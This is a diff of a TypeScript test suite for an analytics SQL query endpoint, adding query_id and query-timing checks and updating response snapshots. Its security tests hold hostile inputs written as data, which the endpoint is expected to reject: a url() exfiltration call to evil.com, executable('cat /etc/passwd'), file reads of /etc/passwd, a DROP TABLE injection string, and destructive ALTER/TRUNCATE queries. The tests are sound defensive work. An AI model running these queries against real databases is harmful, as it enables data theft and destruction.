@@ -1,3 +1,4 @@
+import { wait } from "@stackframe/stack-shared/dist/utils/promises";
 import { deindent } from "@stackframe/stack-shared/dist/utils/strings";
 import { it } from "../../../../helpers";
 import { Project, niceBackendFetch } from "../../../backend-helpers";
@@ -14,20 +15,109 @@ async function runQuery(body: { query: string, params?: Record<string, string>, 
   return response;
 }
 
+type ExpectLike = ((value: unknown) => { toEqual: (value: unknown) => void }) & {
+  any: (constructor: unknown) => unknown,
+};
+
+const stripQueryId = <T extends { status: number, body?: Record<string, unknown> | null }>(response: T, expect: ExpectLike) => {
+  if (response.status === 200 && response.body) {
+    expect(response.body.query_id).toEqual(expect.any(String));
+    delete response.body.query_id;
+  }
+  return response;
+};
+
+async function fetchQueryTiming(queryId: string) {
+  return await niceBackendFetch("/api/v1/internal/analytics/query/timing", {
+    method: "POST",
+    accessType: "server",
+    body: {
+      query_id: queryId,
+    },
+  });
+}
+
+async function fetchQueryTimingWithRetry(queryId: string, attempts = 5, delayMs = 200) {
+  let response = await fetchQueryTiming(queryId);
+  for (let attempt = 0; attempt < attempts; attempt += 1) {
+    if (response.status === 200) {
+      break;
+    }
+    await wait(delayMs);
+    response = await fetchQueryTiming(queryId);
+  }
+  return response;
+}
+
 it("can execute a basic query with admin access", async ({ expect }) => {
   const response = await runQuery({ query: "SELECT 1 as value" });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
+    NiceResponse {
+      "status": 200,
+      "body": { "result": [{ "value": 1 }] },
+      "headers": Headers { <some fields may have been hidden> },
+    }
+  `);
+});
+
+it("returns a query_id for analytics queries", async ({ expect }) => {
+  const response = await runQuery({ query: "SELECT 1 as value" });
+
+  expect(response.status).toBe(200);
+  expect(response.body?.query_id).toEqual(expect.any(String));
+});
+
+it("can fetch query timing by query_id", async ({ expect }) => {
+  const response = await runQuery({ query: "SELECT 1 as value" });
+  const queryId = response.body?.query_id;
+
+  expect(response.status).toBe(200);
+  expect(queryId).toEqual(expect.any(String));
+  if (typeof queryId !== "string") {
+    throw new Error("Expected analytics query response to include query_id.");
+  }
+
+  const timingResponse = await fetchQueryTimingWithRetry(queryId);
+  expect(timingResponse).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
-        "result": [{ "value": 1 }],
         "stats": {
           "cpu_time": <stripped field 'cpu_time'>,
           "wall_clock_time": <stripped field 'wall_clock_time'>,
         },
       },
       "headers": Headers { <some fields may have been hidden> },
+    }
+  `);
+});
+
+it("does not allow fetching timing for another project's query", async ({ expect }) => {
+  await Project.createAndSwitch({ config: { magic_link_enabled: true } });
+  const projectAQuery = await runQuery({ query: "SELECT 1 as value" });
+  const projectAQueryId = projectAQuery.body?.query_id;
+  expect(projectAQuery.status).toBe(200);
+  expect(projectAQueryId).toEqual(expect.any(String));
+  if (typeof projectAQueryId !== "string") {
+    throw new Error("Expected analytics query response to include query_id.");
+  }
+
+  await Project.createAndSwitch({ config: { magic_link_enabled: true } });
+  const response = await fetchQueryTiming(projectAQueryId);
+
+  expect(response).toMatchInlineSnapshot(`
+    NiceResponse {
+      "status": 404,
+      "body": {
+        "code": "ITEM_NOT_FOUND",
+        "details": { "item_id": "<stripped UUID>:main:<stripped UUID>" },
+        "error": "Item with ID \\"<stripped UUID>:main:<stripped UUID>\\" not found.",
+      },
+      "headers": Headers {
+        "x-stack-known-error": "ITEM_NOT_FOUND",
+        <some fields may have been hidden>,
+      },
     }
   `);
 });
@@ -40,16 +130,10 @@ it("can execute a query with parameters", async ({ expect }) => {
     },
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
-      "body": {
-        "result": [{ "value": "hello world" }],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
-      },
+      "body": { "result": [{ "value": "hello world" }] },
       "headers": Headers { <some fields may have been hidden> },
     }
   `);
@@ -61,17 +145,41 @@ it("can execute a query with custom timeout", async ({ expect }) => {
     timeout_ms: 15000,
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
-      "body": {
-        "result": [{ "value": 1 }],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
-      },
+      "body": { "result": [{ "value": 1 }] },
       "headers": Headers { <some fields may have been hidden> },
+    }
+  `);
+});
+
+it("rejects timeouts longer than 2 minutes", async ({ expect }) => {
+  const response = await runQuery({
+    query: "SELECT 1 as value",
+    timeout_ms: 120_001,
+  });
+
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
+    NiceResponse {
+      "status": 400,
+      "body": {
+        "code": "SCHEMA_ERROR",
+        "details": {
+          "message": deindent\`
+            Request validation failed on POST /api/v1/internal/analytics/query:
+              - body.timeout_ms must be less than or equal to 120000
+          \`,
+        },
+        "error": deindent\`
+          Request validation failed on POST /api/v1/internal/analytics/query:
+            - body.timeout_ms must be less than or equal to 120000
+        \`,
+      },
+      "headers": Headers {
+        "x-stack-known-error": "SCHEMA_ERROR",
+        <some fields may have been hidden>,
+      },
     }
   `);
 });
@@ -79,7 +187,7 @@ it("can execute a query with custom timeout", async ({ expect }) => {
 it("validates required query field", async ({ expect }) => {
   const response = await runQuery({} as any);
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -127,7 +235,7 @@ it("handles invalid SQL query", async ({ expect }) => {
 it("can execute query returning multiple rows", async ({ expect }) => {
   const response = await runQuery({ query: "SELECT arrayJoin([0, 1, 2]) AS number" });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
@@ -136,10 +244,6 @@ it("can execute query returning multiple rows", async ({ expect }) => {
           { "number": 1 },
           { "number": 2 },
         ],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
       },
       "headers": Headers { <some fields may have been hidden> },
     }
@@ -155,7 +259,7 @@ it("can execute query with multiple parameters", async ({ expect }) => {
     },
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
@@ -165,10 +269,6 @@ it("can execute query with multiple parameters", async ({ expect }) => {
             "col2": "value2",
           },
         ],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
       },
       "headers": Headers { <some fields may have been hidden> },
     }
@@ -181,7 +281,7 @@ it("can execute query and hit custom timeout", async ({ expect }) => {
     timeout_ms: 1000,
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -202,7 +302,7 @@ it("sets SQL_project_id and SQL_branch_id settings in query", async ({ expect })
     query: "SELECT getSetting('SQL_project_id') AS project_id, getSetting('SQL_branch_id') AS branch_id;",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
@@ -212,10 +312,6 @@ it("sets SQL_project_id and SQL_branch_id settings in query", async ({ expect })
             "project_id": "<stripped UUID>",
           },
         ],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
       },
       "headers": Headers { <some fields may have been hidden> },
     }
@@ -228,7 +324,7 @@ it("does not allow CREATE TABLE", async ({ expect }) => {
     query: "CREATE TABLE IF NOT EXISTS test_table (id UUID) ENGINE = MergeTree() ORDER BY id;",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -258,7 +354,7 @@ it("does not allow CREATE TABLE", async ({ expect }) => {
 it("does not allow querying system tables", async ({ expect }) => {
   const response = await runQuery({ query: "SELECT number FROM system.numbers LIMIT 1" });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -290,7 +386,7 @@ it("does not allow killing queries", async ({ expect }) => {
     query: "KILL QUERY WHERE query_id = '00000000-0000-0000-0000-000000000000'",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -320,7 +416,7 @@ it("does not allow killing queries", async ({ expect }) => {
 it("does not allow INSERT statements", async ({ expect }) => {
   const response = await runQuery({ query: "INSERT INTO system.one (dummy) VALUES (0)" });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -356,7 +452,7 @@ it("does not allow updating ClickHouse settings", async ({ expect }) => {
     `,
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -381,7 +477,7 @@ it("has a restricted user and roles", async ({ expect }) => {
     `,
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
@@ -391,10 +487,6 @@ it("has a restricted user and roles", async ({ expect }) => {
             "user": "limited_user",
           },
         ],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
       },
       "headers": Headers { <some fields may have been hidden> },
     }
@@ -406,7 +498,7 @@ it("has limited grants", async ({ expect }) => {
     query: "SHOW GRANTS WITH IMPLICIT FINAL",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
@@ -452,10 +544,6 @@ it("has limited grants", async ({ expect }) => {
           { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.tables TO limited_user" },
           { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.time_zones TO limited_user" },
         ],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
       },
       "headers": Headers { <some fields may have been hidden> },
     }
@@ -467,7 +555,7 @@ it("can see only some tables", async ({ expect }) => {
     query: "SELECT database, name FROM system.tables",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
       "body": {
@@ -477,10 +565,6 @@ it("can see only some tables", async ({ expect }) => {
             "name": "events",
           },
         ],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
       },
       "headers": Headers { <some fields may have been hidden> },
     }
@@ -492,16 +576,10 @@ it("SHOW TABLES should have the correct tables", async ({ expect }) => {
     query: "SHOW TABLES",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
-      "body": {
-        "result": [{ "name": "events" }],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
-      },
+      "body": { "result": [{ "name": "events" }] },
       "headers": Headers { <some fields may have been hidden> },
     }
   `);
@@ -512,16 +590,10 @@ it("can read the current database", async ({ expect }) => {
     query: "SELECT currentDatabase()",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
-      "body": {
-        "result": [{ "currentDatabase()": "default" }],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
-      },
+      "body": { "result": [{ "currentDatabase()": "default" }] },
       "headers": Headers { <some fields may have been hidden> },
     }
   `);
@@ -533,16 +605,10 @@ it("does not allow SQL injection via parameters", async ({ expect }) => {
     params: { injected: "'; DROP TABLE events; --" },
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
-      "body": {
-        "result": [{ "value": "'; DROP TABLE events; --" }],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
-      },
+      "body": { "result": [{ "value": "'; DROP TABLE events; --" }] },
       "headers": Headers { <some fields may have been hidden> },
     }
   `);
@@ -553,7 +619,7 @@ it("does not allow overriding SQL_project_id setting", async ({ expect }) => {
     query: "SELECT * FROM events SETTINGS SQL_project_id = 'other-project-id'",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -574,7 +640,7 @@ it("does not allow overriding SQL_branch_id setting", async ({ expect }) => {
     query: "SELECT * FROM events SETTINGS SQL_branch_id = 'other-branch-id'",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -595,7 +661,7 @@ it("does not allow accessing system tables via subquery", async ({ expect }) => 
     query: "SELECT * FROM events WHERE 1 = (SELECT count() FROM system.users)",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -626,7 +692,7 @@ it("does not allow UNION to access restricted data", async ({ expect }) => {
     query: "SELECT 1 as value UNION ALL SELECT number FROM system.numbers LIMIT 1",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -657,7 +723,7 @@ it("does not allow file system access via file() function", async ({ expect }) =
     query: "SELECT * FROM file('/etc/passwd', 'CSV', 'line String')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -688,7 +754,7 @@ it("does not allow network access via url() function", async ({ expect }) => {
     query: "SELECT * FROM url('http://evil.com/exfiltrate', 'CSV', 'data String')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -719,7 +785,7 @@ it("does not allow remote table access", async ({ expect }) => {
     query: "SELECT * FROM remote('localhost', system, users)",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -750,7 +816,7 @@ it("does not allow cluster table access", async ({ expect }) => {
     query: "SELECT * FROM cluster('default', system.query_log)",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -781,7 +847,7 @@ it("does not allow multi-statement execution", async ({ expect }) => {
     query: "SELECT 1; SELECT 1",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -810,7 +876,7 @@ it("does not allow CTE to bypass restrictions", async ({ expect }) => {
     query: "WITH secret AS (SELECT * FROM system.users) SELECT * FROM secret",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -841,7 +907,7 @@ it("does not allow accessing tables of other databases", async ({ expect }) => {
     query: "SELECT * FROM analytics.some_table",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -872,7 +938,7 @@ it("does not allow accessing information_schema", async ({ expect }) => {
     query: "SELECT * FROM information_schema.tables",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -903,7 +969,7 @@ it("does not allow dictionary access", async ({ expect }) => {
     query: "SELECT * FROM system.dictionaries",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -934,7 +1000,7 @@ it("does not allow query log snooping", async ({ expect }) => {
     query: "SELECT query FROM system.query_log LIMIT 10",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -966,7 +1032,7 @@ it("does not allow granting privileges", async ({ expect }) => {
   });
 
   // Syntax error as .query does not support GRANT statements
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -987,16 +1053,10 @@ it("shows grants", async ({ expect }) => {
     query: "SHOW GRANTS",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 200,
-      "body": {
-        "result": [{ "GRANTS FORMAT JSONEachRow": "GRANT SELECT ON default.events TO limited_user" }],
-        "stats": {
-          "cpu_time": <stripped field 'cpu_time'>,
-          "wall_clock_time": <stripped field 'wall_clock_time'>,
-        },
-      },
+      "body": { "result": [{ "GRANTS FORMAT JSONEachRow": "GRANT SELECT ON default.events TO limited_user" }] },
       "headers": Headers { <some fields may have been hidden> },
     }
   `);
@@ -1008,7 +1068,7 @@ it("does not allow creating functions", async ({ expect }) => {
   });
 
   // will fail because we do .query; .query does not support CREATE FUNCTION
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1029,7 +1089,7 @@ it("does not allow S3 access", async ({ expect }) => {
     query: "SELECT * FROM s3('https://bucket.s3.amazonaws.com/data.csv')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1060,7 +1120,7 @@ it("does not allow executable table function", async ({ expect }) => {
     query: "SELECT * FROM executable('cat /etc/passwd', 'TabSeparated', 'line String')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1091,7 +1151,7 @@ it("does not allow comment obfuscation to bypass restrictions", async ({ expect 
     query: "SELECT /* system */ * FROM system.users",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1122,7 +1182,7 @@ it("does not allow comment obfuscation in table names", async ({ expect }) => {
     query: "SELECT * FROM system./**/users",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1153,7 +1213,7 @@ it("does not allow creating materialized views", async ({ expect }) => {
     query: "CREATE MATERIALIZED VIEW evil ENGINE = MergeTree ORDER BY x AS SELECT * FROM system.query_log",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1184,7 +1244,7 @@ it("does not allow merge table function to access system tables", async ({ expec
     query: "SELECT * FROM merge('system', '.*')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1205,7 +1265,7 @@ it("does not allow DROP TABLE", async ({ expect }) => {
     query: "DROP TABLE events",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1236,7 +1296,7 @@ it("does not allow ALTER TABLE", async ({ expect }) => {
     query: "ALTER TABLE events ADD COLUMN malicious String",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1267,7 +1327,7 @@ it("does not allow TRUNCATE TABLE", async ({ expect }) => {
     query: "TRUNCATE TABLE events",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1298,7 +1358,7 @@ it("does not allow DELETE statements", async ({ expect }) => {
     query: "ALTER TABLE events DELETE WHERE 1=1",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1329,7 +1389,7 @@ it("does not allow UPDATE statements", async ({ expect }) => {
     query: "ALTER TABLE events UPDATE project_id = 'hacked' WHERE 1=1",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1360,7 +1420,7 @@ it("does not allow accessing system.users", async ({ expect }) => {
     query: "SELECT * FROM system.users",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1392,7 +1452,7 @@ it("does not allow accessing system.processes", async ({ expect }) => {
     query: "SELECT * FROM system.processes",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1423,7 +1483,7 @@ it("does not allow input() function", async ({ expect }) => {
     query: "SELECT * FROM input('x String')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1454,7 +1514,7 @@ it("does not allow numbers table function with large values", async ({ expect })
     query: "SELECT * FROM numbers(1000000000)",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1475,7 +1535,7 @@ it("does not allow jdbc table function", async ({ expect }) => {
     query: "SELECT * FROM jdbc('jdbc:mysql://localhost:3306/db', 'table')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1506,7 +1566,7 @@ it("does not allow mysql table function", async ({ expect }) => {
     query: "SELECT * FROM mysql('localhost:3306', 'database', 'table', 'user', 'password')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
@@ -1537,7 +1597,7 @@ it("does not allow postgresql table function", async ({ expect }) => {
     query: "SELECT * FROM postgresql('localhost:5432', 'database', 'table', 'user', 'password')",
   });
 
-  expect(response).toMatchInlineSnapshot(`
+  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
     NiceResponse {
       "status": 400,
       "body": {
